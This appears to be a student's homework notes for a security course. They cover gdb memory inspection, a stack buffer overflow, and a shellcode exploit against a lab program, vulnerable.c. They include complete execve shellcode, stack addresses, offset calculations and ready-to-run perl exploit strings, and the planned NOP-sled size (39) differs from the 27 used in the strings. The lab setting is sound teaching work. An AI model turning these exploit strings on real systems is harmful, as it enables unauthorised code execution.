## Problem 1. Gdb

In homework 1, questioner.c asks you to guess a secret "magic" number. Use  gdb to examine the program's memory as it runs and extract the magic value.
  
Turn in the screenshot via the hw2 submission link on moodle. 

NOTE TO THE GRADER: I elected to use the questioner that Dr. Wu provided on the moodle lab2 link; I don't use any unsafe (that I know of) method calls in my questioner. Wu's questioner, however, doesn't have a magic number or open a file. It simply generates a random ASCII letter and asks for the "player" to guess it. For this problem I will, obviously, be looking for the generated character rather than a magic number in memory.

## Problem 2. Buffer Overflow on Stack

With the help of gdb, craft an input or an input pattern to overwrite the bufer and make the program output 'SUCCESS' no matter what the magic number is.

Turn in the screenshot via the hw2 submission link on moodle.

NOTE TO THE GRADER: Since I am still using Dr. Wu's questioner.c program it outputs a different success message. the message will be "Succeed!". Also, since her buffer is so small (i.e. char guessed[1]) the overflow will be substantially smaller than with the 2017 version of the Lab1 questioner.c

## Problem 3. Prepare for shellcode expoit

You need to use gdb to examine the memory of a vulnerable program vulnerable.c. Take a screenshot of the memory which indicates at least the following memory addresses:
  * the variable you can fill your input
  * return address
  
Turn in the screenshot via the hw2 sbmission link

## Problem 4. Shellcoding

Write a simple shellcode to print out uerid (I am assuming "uerid" is supposed to be user id).

Turn in the source code (printUid.asm) via the hw2 submission link on moodle.

NOTES TO SELF: 
sys_execve = 11

## Problem 5. Exploit using shellcode

Manipulate a string for your shellcode. Insert this string to the stack of vulnerable.c and make it run your shellcode when execute the program vunlnerable.c

Turn in the screenshot of the result and the string you created via hw2 submission link on moodle.

NOTES TO SELF:
shellcode:
"\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80"
--> 33 bytes

buffer addr: 0xBFFFF770

return addr: 0xBFFFF7BC

Offset of buffer -> return: 76
Buffer Size: 72 (got this number from obj asm and trial and error)
EBP        : 04 
T_BYTES    : 76

NOP sled	  : 39
SHELLCODE	  : 33 (hand counted the hex bytes)
NOP slop	  : 4
T_BYTES		  : 76
New Rtn		  : 0xBFFFF780
T_BYTES + RTN ADDR: 80


String:
(gdb) run $(perl -e 'print"\x90"x27 ; print"\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80" ; print"\x80\xf7\xff\xbf"x5')

(bash) ./vuln $(perl -e 'print"\x90"x27 ; print"\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80" ; print"\x80\xf7\xff\xbf"x5')
